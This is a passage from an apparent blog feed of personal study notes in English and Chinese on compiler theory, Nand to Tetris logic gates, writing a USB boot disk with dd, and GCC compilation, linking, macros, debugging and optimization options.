title="1.2.5 Code Optimization"></a>1.2.5 Code Optimization</h3><p>To improve the intermediate code so that better target code will result.</p><h3 id="1-2-6-Code-Generation"><a href="#1-2-6-Code-Generation" class="headerlink" title="1.2.6 Code Generation"></a>1.2.6 Code Generation</h3><p>The code generator takes as input an intermediate representation of the source program and maps it into the target language.</p><p>The <code>F</code> in each instruction tells us that it deals with floating-point numbers.</p><h3 id="1-2-7-Symbol-Table-Management"><a href="#1-2-7-Symbol-Table-Management" class="headerlink" title="1.2.7 Symbol-Table Management"></a>1.2.7 Symbol-Table Management</h3><p>An essential function of a compiler is to record the variable names used in the source program and collect information about the storage allocated for a name.</p><p>The symbol table is a data structure containing a record for each variable name, with field for the attributes of the name.</p><h3 id="1-2-8-The-Grouping-of-Phases-into-Passes"><a href="#1-2-8-The-Grouping-of-Phases-into-Passes" class="headerlink" title="1.2.8 The Grouping of Phases into Passes"></a>1.2.8 The Grouping of Phases into Passes</h3><h3 id="1-2-9-Compiler-Construction-Tools"><a href="#1-2-9-Compiler-Construction-Tools" class="headerlink" title="1.2.9 Compiler-Construction Tools"></a>1.2.9 Compiler-Construction Tools</h3><h2 id="1-3-The-Evolution-of-Programming-Languages"><a href="#1-3-The-Evolution-of-Programming-Languages" class="headerlink" title="1.3 The Evolution of Programming Languages"></a>1.3 The Evolution of Programming Languages</h2><h3 id="1-3-1-The-Move-to-Higher-level-Language"><a href="#1-3-1-The-Move-to-Higher-level-Language" class="headerlink" title="1.3.1 The Move to Higher-level Language"></a>1.3.1 The Move to Higher-level Language</h3><p>Initially, The instructions in an assembly language were just mnemonic representations of machine instructions. Later, macro instructions were added to assembly languages.</p><p>First-generation languages are the machine languages.</p><p>Second-generation the assembly languages.</p><p>Third-generation the higher-level languages.</p><p>Fourth-generation are languages designed for special application.</p><h3 id="1-3-2-Impact-on-Compilers"><a href="#1-3-2-Impact-on-Compilers" class="headerlink" title="1.3.2 Impact on Compilers"></a>1.3.2 Impact on Compilers</h3><h2 id="1-4-The-Science-of-Building-a-Compiler"><a href="#1-4-The-Science-of-Building-a-Compiler" class="headerlink" title="1.4 The Science of Building a Compiler"></a>1.4 The Science of Building a Compiler</h2><h3 id="1-4-2-The-Science-of-Code-Optimization"><a href="#1-4-2-The-Science-of-Code-Optimization" class="headerlink" title="1.4.2 The Science of Code Optimization"></a>1.4.2 The Science of Code Optimization</h3><h2 id="1-5-Applications-of-Compiler-Technology"><a href="#1-5-Applications-of-Compiler-Technology" class="headerlink" title="1.5 Applications of Compiler Technology"></a>1.5 Applications of Compiler Technology</h2><h3 id="1-5-1-Implementation-of-High-Level-Programming-Languages"><a href="#1-5-1-Implementation-of-High-Level-Programming-Languages" class="headerlink" title="1.5.1 Implementation of High-Level Programming Languages"></a>1.5.1 Implementation of High-Level Programming Languages</h3><p>Optimizing compilers include techniques to improve the performance of generated code, thus offsetting the inefficiency introduced by high-level abstractions.</p><p>The key ideas behind object orientation are:</p><pre><code class="hljs">1. Data abstraction2. Inheritance of properties</code></pre><p>Java has a built-in garbage-collection facility that automatically frees the memory of variable that are no longer in use.</p><h3 id="1-5-2-Optimizations-for-Computer-Architectures"><a href="#1-5-2-Optimizations-for-Computer-Architectures" class="headerlink" title="1.5.2 Optimizations for Computer Architectures"></a>1.5.2 Optimizations for Computer Architectures</h3><p>Two basic techniques:</p><pre><code class="hljs">- parallelism- memory hierarchies</code></pre><h3 id="1-5-4-Program-Translations"><a href="#1-5-4-Program-Translations" class="headerlink" title="1.5.4 Program Translations"></a>1.5.4 Program Translations</h3><h3 id="1-5-5-Software-Productivity-Tools"><a href="#1-5-5-Software-Productivity-Tools" class="headerlink" title="1.5.5 Software Productivity Tools"></a>1.5.5 Software Productivity Tools</h3><h2 id="1-6-Programming-Language-Basics"><a href="#1-6-Programming-Language-Basics" class="headerlink" title="1.6 Programming Language Basics"></a>1.6 Programming Language Basics</h2><h3 id="1-6-1-The-Static-x2F-Dynamic-Distinction"><a href="#1-6-1-The-Static-x2F-Dynamic-Distinction" class="headerlink" title="1.6.1 The Static&#x2F;Dynamic Distinction"></a>1.6.1 The Static&#x2F;Dynamic Distinction</h3><p>If a language uses a policy that allow the compiler to decide an issue, then we say that the language uses a <mark>static</mark> policy or that the issue can be decided at compile time. 意思是需要手动设置吗。</p><p>The scope of declarations. A language uses static scope or lexical scope if it is possible to determine the scope of a declaration by looking only at the program.</p><p>Otherwise, the language uses dynamic scope.</p><p>The compiler to determine the location in memory where the declared variable can be found.</p><h3 id="1-6-2-Environments-and-States"><a href="#1-6-2-Environments-and-States" class="headerlink" title="1.6.2 Environments and States"></a>1.6.2 Environments and States</h3><p>The association of names with locations in memory and then with values can be described by two mappings that change as the program runs. </p><p>The <mark>environment</mark> is a mapping from names to locations in the store.</p><p>The <mark>state</mark> is a mapping from locations in store to their values.</p><h3 id="1-6-4-Explicit-Access-Control"><a href="#1-6-4-Explicit-Access-Control" class="headerlink" title="1.6.4 Explicit Access Control"></a>1.6.4 Explicit Access Control</h3><p>Classes and structures introduce a new scope for their members.</p><h4 id="Declarations-and-Definitions"><a href="#Declarations-and-Definitions" class="headerlink" title="Declarations and Definitions"></a>Declarations and Definitions</h4><p>Declarations tell us about the types of things, while definitions tell us about their values.</p><h3 id="1-6-6-Parameter-Passing-Mechanisms"><a href="#1-6-6-Parameter-Passing-Mechanisms" class="headerlink" title="1.6.6 Parameter Passing Mechanisms"></a>1.6.6 Parameter Passing Mechanisms</h3><p>The strict call-by-value requires that the caller copy the entire actual parameter into the soace belonging to the corresponding formal parameter.</p><h1 id="Chapter-2-A-Simple-Symtax-Directed-Translator"><a href="#Chapter-2-A-Simple-Symtax-Directed-Translator" class="headerlink" title="Chapter 2 A Simple Symtax-Directed Translator"></a>Chapter 2 A Simple Symtax-Directed Translator</h1><h2 id="2-1-Introduction"><a href="#2-1-Introduction" class="headerlink" title="2.1 Introduction"></a>2.1 Introduction</h2><p>A notation in which operators appear after their operands.</p><p>Two forms of intermediate code are:<br>    - abstract syntax trees<br>    - simply syntax trees<br>represents the hierarchical syntactic structure of the source program.</p><p><mark>Three-address code</mark><br>The form:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">x</span><span class="hljs-operator">=</span>y op y<br></code></pre></td></tr></table></figure><p><code>op</code> is a binary operator, y and z are addressed for operands, and x is the address for the result of the operation.</p><h2 id="2-2-Syntax-Definition"><a href="#2-2-Syntax-Definition" class="headerlink" title="2.2 Syntax Definition"></a>2.2 Syntax Definition</h2><p>A grammar naturally describes the hierarchical structure of most programming language constructs.</p><p>Such a rule is called a <mark>production</mark>. In a production, lexical elements like the keyword <code>if</code> and the parentheses are called <mark>terminals</mark>. Variable like <code>expr</code> and <code>stmt</code> represent sequences of terminals and are called <mark>nonterminals</mark>.</p><h3 id="2-2-3-Parse-Trees"><a href="#2-2-3-Parse-Trees" class="headerlink" title="2.2.3 Parse Trees"></a>2.2.3 Parse Trees</h3><p>A <mark>parse tree</mark> pictorially shows how the start symble of a grammar derives a string in the language.</p>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>The Elements of Computing System Notes</title>
    <link href="/2022/07/26/The-Elements-of-Computing-System-Notes/"/>
    <url>/2022/07/26/The-Elements-of-Computing-System-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h1><h2 id="Hello-World-Below"><a href="#Hello-World-Below" class="headerlink" title="Hello, World Below"></a>Hello, World Below</h2><h2 id="Nand-to-Tetris"><a href="#Nand-to-Tetris" class="headerlink" title="Nand to Tetris"></a>Nand to Tetris</h2><h2 id="Abstraction-and-Implementation"><a href="#Abstraction-and-Implementation" class="headerlink" title="Abstraction and Implementation"></a>Abstraction and Implementation</h2><p>Abstraction describes what the module does, and implementation describes how it does it.</p><p>The RAM contains billions of registers, yet any of them can be accessed directly.</p><p>The RAM storage and direct-access capabilities will be relized using registers and multiplexers.</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><h2 id="The-Road-Ahead"><a href="#The-Road-Ahead" class="headerlink" title="The Road Ahead"></a>The Road Ahead</h2><h1 id="1-Boolean-Logic"><a href="#1-Boolean-Logic" class="headerlink" title="1 Boolean Logic"></a>1 Boolean Logic</h1><p>Elementary logic gates.</p><p>Nand, Not, And, Or, and Xor.</p><p>Multiplexer and Demultiplexer.</p><h2 id="1-1-Boolean-Algebra"><a href="#1-1-Boolean-Algebra" class="headerlink" title="1.1 Boolean Algebra"></a>1.1 Boolean Algebra</h2><p>A Boolean function is a function that operates on binary inputs and returns binary outputs.</p><p>The name of the Nand operator is shorthand for Not-And.</p><p>The Xor operator–shorthand for exclusive or.</p><p>The Nor gate derives its name from Not-Or.</p><p>Any Boolean function can be realized using Nand gates only.</p><h3 id="Truth-Tables-and-Boolean-Expressions"><a href="#Truth-Tables-and-Boolean-Expressions" class="headerlink" title="Truth Tables and Boolean Expressions"></a>Truth Tables and Boolean Expressions</h3><p>A turth table is often a convenient means for describing some states of nature.</p><p>The ability to simplify a Boolean expression is the first step toward hardware optimization.</p><h2 id="1-2-Logic-Gates"><a href="#1-2-Logic-Gates" class="headerlink" title="1.2 Logic Gates"></a>1.2 Logic Gates</h2><p>Computer scientist don not have to worry about physical artifacts.</p><h3 id="Primitive-and-Composite-Gates"><a href="#Primitive-and-Composite-Gates" class="headerlink" title="Primitive and Composite Gates"></a>Primitive and Composite Gates</h3><p>Any given logic gate can be viewed from two different perspectives:</p><pre><code class="hljs">- internal- external</code></pre><h2 id="1-3-Hardware-Construction"><a href="#1-3-Hardware-Construction" class="headerlink" title="1.3 Hardware Construction"></a>1.3 Hardware Construction</h2><h3 id="1-3-1-Hardware-Description-Language"><a href="#1-3-1-Hardware-Description-Language" class="headerlink" title="1.3.1 Hardware Description Language"></a>1.3.1 Hardware Description Language</h3><p>p42</p>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Using dd command</title>
    <link href="/2022/07/24/Using-dd-command/"/>
    <url>/2022/07/24/Using-dd-command/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/xiao_yi_xiao/article/details/119325002">rference</a></p><h1 id="首先查找-U-盘设备"><a href="#首先查找-U-盘设备" class="headerlink" title="首先查找 U 盘设备"></a>首先查找 U 盘设备</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo fdisk -l<br></code></pre></td></tr></table></figure><h1 id="卸载-U-盘"><a href="#卸载-U-盘" class="headerlink" title="卸载 U 盘"></a>卸载 U 盘</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo umount <span class="hljs-regexp">/dev/</span>sda1<br></code></pre></td></tr></table></figure><h1 id="使用-dd-命令制作启动盘"><a href="#使用-dd-命令制作启动盘" class="headerlink" title="使用 dd 命令制作启动盘"></a>使用 dd 命令制作启动盘</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo dd <span class="hljs-attribute">if</span>=xxx.iso <span class="hljs-attribute">of</span>=U盘路径 <span class="hljs-attribute">status</span>=progress<br></code></pre></td></tr></table></figure><p>注意不要填上数字，要写成如: <code>/dev/sda</code>.</p><p>这里 <code>status=LEVEL</code>, 是和报错相关.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>An Introduction to GCC Notes</title>
    <link href="/2022/07/23/An-Introduction-to-GCC-Notes/"/>
    <url>/2022/07/23/An-Introduction-to-GCC-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1: Introduction"></a>Chapter 1: Introduction</h1><h1 id="Chapter-2-Compiling-a-C-program"><a href="#Chapter-2-Compiling-a-C-program" class="headerlink" title="Chapter 2: Compiling a C program"></a>Chapter 2: Compiling a C program</h1><p>The <code>-o</code> option is usually given as the last argument on the command line.</p><p>If the <code>-o</code> option is omitted, the output is written to a default file called ‘a.out’.</p><p>Always using <code>-Wall</code> option.</p><p>The messages produced by GCC always have th  form:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>:<span class="hljs-built_in">line</span>-<span class="hljs-built_in">number</span>:message<br></code></pre></td></tr></table></figure><p>The linker fills in these missing addresses when it produces the executable.</p><h3 id="2-4-1-Creating-object-file-from-source-files"><a href="#2-4-1-Creating-object-file-from-source-files" class="headerlink" title="2.4.1 Creating object file from source files"></a>2.4.1 Creating object file from source files</h3><p>The command-line option <code>-c</code> is used to compile a source file to an object file.</p><h3 id="2-4-2-Creating-executables-from-object-files"><a href="#2-4-2-Creating-executables-from-object-files" class="headerlink" title="2.4.2 Creating executables from object files"></a>2.4.2 Creating executables from object files</h3><p>Use gcc to link the object files together and fill in the missing addresse of external functions.</p><p>A separate program, linker ld.</p><h3 id="2-4-3-Link-order-of-object-files"><a href="#2-4-3-Link-order-of-object-files" class="headerlink" title="2.4.3 Link order of object files"></a>2.4.3 Link order of object files</h3><p>The object file which contains the definition of a function should appear after any files which call that function.</p><h2 id="2-5-Recompiling-and-relinking"><a href="#2-5-Recompiling-and-relinking" class="headerlink" title="2.5 Recompiling and relinking"></a>2.5 Recompiling and relinking</h2><p>Linking is faster than compilation.</p><h2 id="2-6-Linking-with-external-libraries"><a href="#2-6-Linking-with-external-libraries" class="headerlink" title="2.6 Linking with external libraries"></a>2.6 Linking with external libraries</h2><p>A library is a collection of precompiled object files which can be linked into programs.</p><p>Libraries are typically stored in special archive files with the extension <code>.a</code>, refferred to as static libraries.</p><p>They are created from object files with a saparate tool, <mark>the GNU archiver ar</mark>, and used by the linker to resolve references to functions at compile-time.</p><p>The standard system libraries are usually found in the directories <code>/usr/lib</code> and <code>/lib</code>.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ gcc -Wall calc.c <span class="hljs-regexp">/usr/</span>lib/libm.a -o calc<br></code></pre></td></tr></table></figure><p>The library <code>libm.a</code> contains object files for all the mathematical functions.</p><p>使用缩写, the compiler option <code>-lNAME</code> will attempt to link object files with a library file <code>libNAME.a</code> in the standard library directories.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall calc.c -lm -o calc<br></code></pre></td></tr></table></figure><h3 id="2-6-1-Link-order-of-libraries"><a href="#2-6-1-Link-order-of-libraries" class="headerlink" title="2.6.1 Link order of libraries"></a>2.6.1 Link order of libraries</h3><p>Searching from left to right. 左边缺少的到右边找。</p><h2 id="2-7-Using-library-header-files"><a href="#2-7-Using-library-header-files" class="headerlink" title="2.7 Using library header files"></a>2.7 Using library header files</h2><p>In order to declare function arguments and return values with the correct types. 没有声明，参数的类型会出错。</p><h1 id="Chapter-3-Compilation-options"><a href="#Chapter-3-Compilation-options" class="headerlink" title="Chapter 3: Compilation options"></a>Chapter 3: Compilation options</h1><p>By default, gcc searches the following directories for header files:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>local/<span class="hljs-keyword">include</span><br><span class="hljs-regexp">/usr/i</span>nclude<br></code></pre></td></tr></table></figure><p>For libraries:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local/lib<br><span class="hljs-regexp">/usr/</span>lib<br></code></pre></td></tr></table></figure><p>Local 的优先级更高。</p><p>You should never place the absolute paths of header files in <code>#include</code> statement.</p><p><code>-I</code> option or <code>INCLUDE_PATH</code> variable. 可指定额外的<code>#include</code> 路径。</p><p><code>-L</code> option or <code>LIBRARY_PATH</code> variable. 可指定额外的 link path.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ gcc -Wall -I<span class="hljs-regexp">/opt/g</span>dbm-<span class="hljs-number">1.8</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/include -L/</span>opt<span class="hljs-regexp">/gdbm-1.8.3/</span>lib demain.c -lgdbm<br></code></pre></td></tr></table></figure><p>若设置了<code>C_INCLUDE_PATH</code> 或 <code>CPLUS_INCLUDE_PATH</code> 或 <code>LIBRARY_PATH</code> 就不用使用<code>-I</code>和<code>-L</code>选项。</p><h3 id="3-1-3-Extended-search-paths"><a href="#3-1-3-Extended-search-paths" class="headerlink" title="3.1.3 Extended search paths"></a>3.1.3 Extended search paths</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">DIR1<span class="hljs-selector-pseudo">:DIR</span>2<span class="hljs-selector-pseudo">:DIR</span>3:...<br></code></pre></td></tr></table></figure><p>or</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ gcc -I. -I/<span class="hljs-meta">opt</span>/<span class="hljs-meta">include</span><br></code></pre></td></tr></table></figure><p>多次使用<code>-I</code> or <code>-L</code>.</p><p>查找顺序:</p><pre><code class="hljs">1. command-line option `-I` and `-L`, from left to right2. directories specified by environment variables, such as C_INLUDE_PATH and LIBRARY_PATH3. default system directories</code></pre><h2 id="3-2-Shared-libraries-and-static-libraries"><a href="#3-2-Shared-libraries-and-static-libraries" class="headerlink" title="3.2 Shared libraries and static libraries"></a>3.2 Shared libraries and static libraries</h2><p>External libraries are usually provided in two forms:</p><pre><code class="hljs">1. static libraries, &#39;.a&#39; file2. shared libries, &#39;.so&#39; file</code></pre><p>Dynamic linking makes executable files smaller and saves disk space.</p><p>shared libraries 比 static library 更好。</p><p>Shared object file is used in preference to the static library.</p><p>static library 包含所有的function的machine code, 而 shared object file 只包含一部分。</p><p>By default, the loader searches for shared libraries only in a predefined set of system deirectories.</p><p>Setting load path: use variable <code>LD_LIBRARY_PATH</code></p><p>Adding new:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">LD_LIBRARY_PATH=/opt/gdbm-1.8.3/lib:<span class="hljs-variable">$LD_LIBRARY_PATH</span></span><br></code></pre></td></tr></table></figure><p>Option <code>-static</code> to avoid using shared library.</p><h2 id="3-3-C-language-standards"><a href="#3-3-C-language-standards" class="headerlink" title="3.3 C language standards"></a>3.3 C language standards</h2><p>Controling the dialect of C, use <code>-ansi</code> and <code>-pedantic</code>.</p><p>针对与C版本之间的差异。</p><h3 id="3-3-1-ANSI-x2F-ISO"><a href="#3-3-1-ANSI-x2F-ISO" class="headerlink" title="3.3.1 ANSI&#x2F;ISO"></a>3.3.1 ANSI&#x2F;ISO</h3><p>A valid ANSI&#x2F;ISO program may be incompatible with the extention in GNU C.</p><p><code>_GNU_SOURCE</code>, which enable extensions in the GNU C library.</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> gcc -Wall -ansi -D_GNU_SOURCE <span class="hljs-built_in">pi</span>.c<br></code></pre></td></tr></table></figure><h3 id="3-3-3-Selecting-special-standards"><a href="#3-3-3-Selecting-special-standards" class="headerlink" title="3.3.3 Selecting special standards"></a>3.3.3 Selecting special standards</h3><p>The special language standard used by GCC can be controled with the ‘-std’ option.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">-std</span>=c99<br></code></pre></td></tr></table></figure><h2 id="3-4-Warning-options-in-Wall"><a href="#3-4-Warning-options-in-Wall" class="headerlink" title="3.4 Warning options in -Wall"></a>3.4 Warning options in -Wall</h2><p>Warning options can also be selected individually. 如:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-Wcomment</span><br><br><span class="hljs-deletion">-Wformat</span><br><br>...<br></code></pre></td></tr></table></figure><h2 id="3-5-Additional-warning-options"><a href="#3-5-Additional-warning-options" class="headerlink" title="3.5 Additional warning options"></a>3.5 Additional warning options</h2><p><code>-W</code> a general option similar to <code>-Wall</code>.</p><h1 id="4-Using-the-preprocessor"><a href="#4-Using-the-preprocessor" class="headerlink" title="4 Using the preprocessor"></a>4 Using the preprocessor</h1><p>The GNU C preprocessor cpp.</p><p>It expands macros in source files before they are compiled.</p><h2 id="4-1-Defining-macro"><a href="#4-1-Defining-macro" class="headerlink" title="4.1 Defining macro"></a>4.1 Defining macro</h2><p>The gcc option <code>-DNAME</code> defines a preprocessor macro NAME from the command line.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall -DTEST dtest.c<br></code></pre></td></tr></table></figure><p>gcc 自动定义的 macro, with a double-underscore prefix <code>__</code>:</p><p>查看:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ cpp -dM <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><h2 id="4-2-Macro-with-values"><a href="#4-2-Macro-with-values" class="headerlink" title="4.2 Macro with values"></a>4.2 Macro with values</h2><p><code>-DNAME=VALUE</code>:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ gcc -Wall <span class="hljs-attribute">-DNUM</span>=100 dtestval.c<br></code></pre></td></tr></table></figure><p>It is a good idea to surround macros by parenthesses.</p><p>When a macro is defined with <code>-D</code> alone, gcc used a default value of 1.</p><p>Empty value:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">-DNAME</span>=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>Define a macro message:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">-DNAME</span>=<span class="hljs-string">&quot;\&quot;Hello, World!\&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="4-3-Preprocessing-source-files"><a href="#4-3-Preprocessing-source-files" class="headerlink" title="4.3 Preprocessing source files"></a>4.3 Preprocessing source files</h2><p>To see the effect of the preprocessor on source file directly, using the <code>-E</code> option.</p><p><code>-save-temps</code> option, the preprocessed output will be available in the file <code>hello.i</code>.</p><h1 id="5-Compiling-for-debugging"><a href="#5-Compiling-for-debugging" class="headerlink" title="5 Compiling for debugging"></a>5 Compiling for debugging</h1><p><code>-g</code> option to store additional debugging information in object files and executables.</p><p>GNU Debugger gdb.</p><p>Storing the names of functions and variables, with their corresponding source code line-numbers.</p><h2 id="5-1-Examining-core-files"><a href="#5-1-Examining-core-files" class="headerlink" title="5.1 Examining core files"></a>5.1 Examining core files</h2><p>The core file can be used to find the line where the program stopped, and the values of its variables at that point.</p><p>A null pointer will only cause a problem at run-time, so the option <code>-Wall</code> does not produce any warning.</p><p>Whenever the error message <code>core dumped</code> is displayed, the operating system should produce a file called <code>core</code> in the current directory.</p><p>The term <code>segmentation fault</code> refers to the fact that the program tried to access a restricted memory <code>segment</code> outside the area of memory which had been allocated to it.</p><p>In the GNU Bash shell the command <code>ulimit -c</code> control the maximum size of core files.</p><p>Any size to be written:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ulimit</span> -c unlimited</span><br></code></pre></td></tr></table></figure><p>only apply to the current shell.</p><p>Loading the core file into the GNU Debugger gdb:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> gdb EXEECUTABLE-<span class="hljs-keyword">FILE</span> CORE-<span class="hljs-keyword">FILE</span><br></code></pre></td></tr></table></figure><p>both the original executable file and the core file are required for debugging.</p><h1 id="6-Compiling-with-optimization"><a href="#6-Compiling-with-optimization" class="headerlink" title="6 Compiling with optimization"></a>6 Compiling with optimization</h1><h2 id="6-1-Source-level-optimization"><a href="#6-1-Source-level-optimization" class="headerlink" title="6.1 Source-level optimization"></a>6.1 Source-level optimization</h2><p>Two type:</p><pre><code class="hljs">- common subexpression elimination- function inlining</code></pre><h3 id="6-1-1-Common-subexpression-elimination"><a href="#6-1-1-Common-subexpression-elimination" class="headerlink" title="6.1.1 Common subexpression elimination"></a>6.1.1 Common subexpression elimination</h3><p>Reusing already-computed results.<br>如:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">x = cos(<span class="hljs-name">v</span>)*(<span class="hljs-number">1</span>+sin(<span class="hljs-name">u/2</span>)) + sin(<span class="hljs-name">w</span>)*(<span class="hljs-number">1</span>-sin(<span class="hljs-name">u/2</span>))<br></code></pre></td></tr></table></figure><p>重写为:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">t</span> = <span class="hljs-built_in">sin</span>(u/<span class="hljs-number">2</span>);<br>x = <span class="hljs-built_in">cos</span>(v)*(<span class="hljs-number">1</span>+<span class="hljs-built_in">t</span>) + <span class="hljs-built_in">sin</span>(w)*(<span class="hljs-number">1</span>-<span class="hljs-built_in">t</span>);<br></code></pre></td></tr></table></figure><p>可以 increase the speed and reduces the size of the code.</p><h3 id="6-1-2-Function-inlining"><a href="#6-1-2-Function-inlining" class="headerlink" title="6.1.2 Function inlining"></a>6.1.2 Function inlining</h3><p>Increase the efficiency of frequently-called functions.</p><p>Replacing calls to a function by the code of the function itself.</p><p>Eliminating the function call.</p><p>The function being suitably small.</p><h2 id="6-2-Speed-space-tradeoffs"><a href="#6-2-Speed-space-tradeoffs" class="headerlink" title="6.2 Speed-space tradeoffs"></a>6.2 Speed-space tradeoffs</h2><p>Choose between speed and memory is referred to as speed-space tradeoffs.</p><h3 id="6-2-1-Loop-unrolling"><a href="#6-2-1-Loop-unrolling" class="headerlink" title="6.2.1 Loop unrolling"></a>6.2.1 Loop unrolling</h3><p>将循环拆开，这样可以减少测试的时间:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for(i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 8; i++) &#123;</span><br>  y[i] <span class="hljs-operator">=</span> i<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>改为:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">y[<span class="hljs-number">0</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">3</span>] <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">4</span>] <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">5</span>] <span class="hljs-operator">=</span> <span class="hljs-number">5</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">6</span>] <span class="hljs-operator">=</span> <span class="hljs-number">6</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">7</span>] <span class="hljs-operator">=</span> <span class="hljs-number">7</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="6-3-Scheduling"><a href="#6-3-Scheduling" class="headerlink" title="6.3 Scheduling"></a>6.3 Scheduling</h2><p>The results become available to later instructions at the right time.</p><h2 id="6-4-Optimization-levels"><a href="#6-4-Optimization-levels" class="headerlink" title="6.4 Optimization levels"></a>6.4 Optimization levels</h2><p>Numbered from 0-3.</p><p>The command line option <code>-oLEVEL</code>.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 